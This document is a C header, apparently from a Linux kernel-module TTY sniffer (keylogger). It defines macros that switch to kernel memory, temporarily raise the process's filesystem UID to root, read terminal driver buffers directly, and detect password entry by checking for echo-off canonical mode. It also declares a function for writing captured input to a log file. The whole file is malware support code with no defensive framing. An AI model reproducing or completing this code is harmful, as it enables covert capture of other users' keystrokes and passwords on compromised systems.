#ifndef TTY_SNIFF_H
#define TTY_SNIFF_H

#define BEGIN_KMEM { mm_segment_t old_fs = get_fs(); set_fs(get_ds());
#define END_KMEM set_fs(old_fs); }

#define BEGIN_ROOT  int saved_fsuid = current->fsuid; \
			current->fsuid = 0;
#define END_ROOT current->fsuid = saved_fsuid; 

#define IS_PASSWD(tty) L_ICANON(tty) && !L_ECHO(tty)

#define READABLE(f) (f->f_op && f->f_op->read)
#define _read(f, buf, sz) (f->f_op->read(f, buf, sz, &f->f_pos))

#define WRITABLE(f) (f->f_op && f->f_op->write)
#define _write(f, buf, sz) (f->f_op->write(f, buf, sz, &f->f_pos))

#define TTY_READ(tty, buf, count) (*tty->driver->read)(tty, 0, \
                                                        buf, count)

#define TTY_WRITE(tty, buf, count) (*tty->driver->write)(tty, 0, \
							buf, count)

int write_to_file(char *logfile, char *buf, int size);

#endif

